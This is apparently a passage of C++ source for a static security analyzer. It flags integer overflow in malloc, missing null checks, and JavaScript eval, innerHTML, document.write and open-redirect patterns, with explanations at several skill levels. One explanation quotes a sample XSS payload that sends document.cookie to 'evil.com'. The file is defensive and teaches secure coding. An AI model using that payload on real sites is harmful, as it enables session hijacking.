                f.description  = "malloc(n * sizeof(...)) can overflow if n is very large, wrapping to a tiny number. The buffer will be far too small.";
                f.whyItMatters = "An attacker who controls n can cause malloc to allocate 16 bytes when your code thinks it has 4 GB, creating a heap overflow.";
                f.fixSuggestion = "Use calloc(n, sizeof(type)) which handles the overflow check for you.";
                break;
            case 2:
                f.description  = "malloc(n * sizeof) — integer overflow → undersized allocation if n is attacker-controlled (CWE-190).";
                f.whyItMatters = "Integer overflow in allocation size is a classic heap overflow precursor.";
                f.fixSuggestion = "calloc(n, sizeof(T)) or validate n <= SIZE_MAX/sizeof(T).";
                break;
            default:
                f.description  = "malloc(n*sizeof) — integer overflow (CWE-190).";
                f.whyItMatters = "Heap overflow via undersized allocation.";
                f.fixSuggestion = "calloc().";
                break;
            }
            findings.append(f);
        }

        if (reMallocNoCheckSimple.match(line).hasMatch()) {
            bool hasNullCheck = false;
            for (int j = i + 1; j < qMin(i + 4, lines.size()); ++j) {
                QString next = lines[j].trimmed();
                if (next.isEmpty()) continue;
                if (next.contains("== NULL") || next.contains("!= NULL") ||
                    next.contains("== nullptr") || next.contains("!= nullptr") ||
                    next.contains("if (") || next.contains("if(") || next.contains("assert(")) {
                    hasNullCheck = true;
                }
                break;
            }
            if (!hasNullCheck) {
                SecurityFinding f;
                f.severity   = SecurityFinding::MEDIUM;
                f.title      = "Missing Null Check After malloc()";
                f.lineNumber = i + 1;
                switch (level) {
                case 1:
                    f.description  = "malloc() can return NULL if the computer runs out of memory. Using a NULL pointer crashes the program.";
                    f.whyItMatters = "An attacker can exhaust server memory to trigger this NULL, then cause a crash. In privileged code a null dereference can enable privilege escalation.";
                    f.fixSuggestion = "if (ptr == NULL) { /* handle error */ } right after malloc().";
                    break;
                case 2:
                    f.description  = "Unchecked malloc() return — dereferencing NULL causes crash (CWE-476).";
                    f.whyItMatters = "DoS via crash; null-page exploits in some kernel/privileged contexts.";
                    f.fixSuggestion = "if (!ptr) { perror(\"malloc\"); exit(EXIT_FAILURE); }";
                    break;
                default:
                    f.description  = "Unchecked malloc() (CWE-476).";
                    f.whyItMatters = "DoS / potential privilege escalation.";
                    f.fixSuggestion = "Check ptr != NULL.";
                    break;
                }
                findings.append(f);
            }
        }
    }

    return findings;
}

// ── JavaScript checks ────────────────────────────────────────────────────────
QList<SecurityFinding> StaticAnalyzer::scanJavaScript(const QStringList& lines, int level) const
{
    QList<SecurityFinding> findings;

    static const QRegularExpression reEval(R"(\beval\s*\()");
    static const QRegularExpression reInnerHTML(R"(\.innerHTML\s*[+]?=)");
    static const QRegularExpression reDocWrite(R"(\bdocument\.write\s*\()");
    static const QRegularExpression reWinLoc(R"(\bwindow\.location\s*[+]?=\s*[a-zA-Z_])");

    for (int i = 0; i < lines.size(); ++i) {
        const QString& line = lines[i];
        if (line.trimmed().startsWith("//")) continue;

        if (reEval.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::CRITICAL;
            f.title      = "Code Injection via eval()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "eval() runs text as JavaScript. An attacker who controls the text can steal cookies or take over the page.";
                f.whyItMatters = "An attacker injects document.cookie into the eval'd string and sends your session token to their server — instant account takeover.";
                f.fixSuggestion = "Never use eval() with user data. Use JSON.parse() for data.";
                break;
            case 2:
                f.description  = "eval() executes arbitrary JS — XSS/code injection if user input reaches it.";
                f.whyItMatters = "eval-based XSS bypasses many content filters. Attacker steals sessions, redirects users, or runs crypto miners.";
                f.fixSuggestion = "JSON.parse() for data; avoid eval() entirely.";
                break;
            default:
                f.description  = "eval() — code injection (CWE-95).";
                f.whyItMatters = "XSS / session hijack / page takeover.";
                f.fixSuggestion = "JSON.parse(); no eval().";
                break;
            }
            findings.append(f);
        }

        if (reInnerHTML.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "XSS via innerHTML";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "Putting user text into innerHTML can run hidden scripts. An attacker can steal session cookies.";
                f.whyItMatters = "An attacker posts a comment with <script>fetch('evil.com?c='+document.cookie)</script> "
                                 "and steals every visitor's login session.";
                f.fixSuggestion = "Use textContent instead of innerHTML for user-provided text.";
                break;
            case 2:
                f.description  = "innerHTML with user-controlled value — stored or reflected XSS (CWE-79).";
                f.whyItMatters = "XSS enables session hijacking, credential harvesting, and drive-by malware delivery.";
                f.fixSuggestion = "textContent for text; DOMPurify.sanitize() if HTML is required.";
                break;
            default:
                f.description  = "innerHTML — XSS (CWE-79).";
                f.whyItMatters = "Session hijack, phishing, defacement.";
                f.fixSuggestion = "textContent or DOMPurify.";
                break;
            }
            findings.append(f);
        }

        if (reDocWrite.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "XSS via document.write()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "document.write() inserts raw HTML. If any user text goes in, attackers can inject scripts.";
                f.whyItMatters = "Injected script tag runs instantly in your page's origin, accessing all cookies and storage.";
                f.fixSuggestion = "Use DOM methods (createElement, appendChild) instead.";
                break;
            case 2:
                f.description  = "document.write() with user-controlled content — XSS (CWE-79).";
                f.whyItMatters = "Script injection in page origin context — full access to cookies and local storage.";
                f.fixSuggestion = "DOM manipulation APIs.";
                break;
            default:
                f.description  = "document.write() — XSS (CWE-79).";
                f.whyItMatters = "Script injection in origin context.";
                f.fixSuggestion = "DOM APIs.";
                break;
            }
            findings.append(f);
        }

        if (reWinLoc.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::MEDIUM;
            f.title      = "Open Redirect via window.location";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "Setting window.location from a variable can redirect users to a malicious site.";
                f.whyItMatters = "Attackers send phishing links like yoursite.com/redirect?to=evil.com/login. "
                                 "Victims trust your domain and don't notice they've landed on a fake login page.";
                f.fixSuggestion = "Validate the redirect target against a list of allowed URLs.";
                break;
            case 2:
                f.description  = "window.location from variable — open redirect (CWE-601).";
                f.whyItMatters = "Your trusted domain becomes a phishing launderer — attackers craft links that start at your site.";
                f.fixSuggestion = "Whitelist allowed redirect targets.";
                break;
            default:
                f.description  = "Unvalidated redirect (CWE-601).";
                f.whyItMatters = "Phishing via trusted domain.";
                f.fixSuggestion = "Whitelist allowed destinations.";
                break;
            }
            findings.append(f);
        }
    }

    return findings;
}
